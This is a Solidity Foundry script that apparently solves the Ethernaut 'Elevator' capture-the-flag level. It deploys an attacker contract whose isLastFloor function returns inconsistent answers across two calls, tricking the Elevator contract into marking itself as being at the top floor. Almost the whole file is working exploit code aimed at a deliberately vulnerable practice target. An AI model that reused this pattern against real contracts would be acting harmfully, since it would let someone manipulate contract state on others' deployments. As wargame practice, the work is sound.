// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;


import{Script,console} from "forge-std/Script.sol";
import{Elevator} from "../src/Level11.sol";


contract MyBuilding{
        Elevator public elevator=Elevator(0x61A46CFa9e526a86f9f692aEC1C39069379c47c2);
        
        bool status=false;
        function isLastFloor(uint256 floor) external returns(bool){
            if(!status){
                status=true;
                return false; //first time return false
            }else{
                status=false;
                return true;   //second time return true
            }
        }
        function goTo(uint256 floor) public{  //MyBuilding address wil be the msg.sender for Elevator contract
            elevator.goTo(floor);
        }  
}
contract Level11Solution is Script{
    Elevator public elevator=Elevator(0x61A46CFa9e526a86f9f692aEC1C39069379c47c2);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("is reached top of the building :",elevator.top());
        MyBuilding myBuilding =new MyBuilding();
        myBuilding.goTo(UINT256_MAX);
        console.log("is reached top of the building :",elevator.top());
        vm.stopBroadcast();
    }
}